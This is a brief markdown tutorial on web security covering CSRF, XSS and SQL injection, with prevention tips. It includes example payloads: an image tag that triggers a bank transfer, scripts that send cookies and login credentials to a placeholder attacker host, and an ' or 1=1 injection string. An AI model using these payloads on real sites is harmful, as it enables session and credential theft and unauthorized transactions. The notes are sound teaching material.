- [Security](#security)
  - [CSRF(Cross Site Reuest Forgery)](#csrfcross-site-reuest-forgery)
    - [Volubility](#volubility)
      - [example (transfer money)](#example-transfer-money)
    - [How to prevent](#how-to-prevent)
      - [token](#token)
      - [http header Referer](#http-header-referer)
  - [XSS(Cross Site Scripting)](#xsscross-site-scripting)
    - [Volubility](#volubility-1)
      - [example 1(get cookie)](#example-1get-cookie)
      - [example 2(get login info)](#example-2get-login-info)
    - [How to prevent](#how-to-prevent-1)
      - [Input: sanitize all user input](#input-sanitize-all-user-input)
      - [Output: escape before output](#output-escape-before-output)
  - [SQL Injection](#sql-injection)
    - [example](#example)
    - [How to prevent](#how-to-prevent-2)

## Security

### CSRF(Cross Site Reuest Forgery)

#### Volubility
 - the attacker site pretend the real site request.

##### example (transfer money)

```html
<img src = “http://www.bank.com/transfer.do?toAct=123456&money=10000>
```

#### How to prevent
##### token
- laravel @csrf

##### http header Referer

### XSS(Cross Site Scripting)

#### Volubility

##### example 1(get cookie)
```html
<script>location.replace("http://www.attackpage.com/record.asp?secret="+document.cookie)</script>
```

##### example 2(get login info)
```html
<script>
  function hack(){
  　　location.replace("http://www.attackpage.com/record.asp?username="+document.forms[0].user.value + "password=" + document.forms[0].pass.value);
  }
</script>
<form>
  <h1>Login</h1>
　<p>Username:</p>
　<input type=”text” id=”user”name=”user” />
　<p>passworlg:</p>
　<input type=”password” name =“pass” />
　<input type=”submit”name=”login” value=”signin” onclick=”hack()” />
</form>

```


#### How to prevent

##### Input: sanitize all user input
- [node package](https://www.npmjs.com/package/sanitize-html)

##### Output: escape before output

normal output escape automatically, only needed data use dangerous directive.

- react - dangerouslySetInnerHTML
- vue - v-html


### SQL Injection

#### example

- user select sql

```sql
　　SELECT * FROM  users  WHERE login = 'victor' AND password = '123
```

- user find logic

```js
const formusr = "' or 1=1"
const formpwd = "anything"
const sql = "SELECT * FROM users WHERE login = '" + formusr + "' AND password = '" + formpwd + "'";
```

- final excuting sql
```sql
　　SELECT * FROM users WHERE username = ' ' or 1=1  AND password = 'anything'
```

#### How to prevent

- escape any sql before execution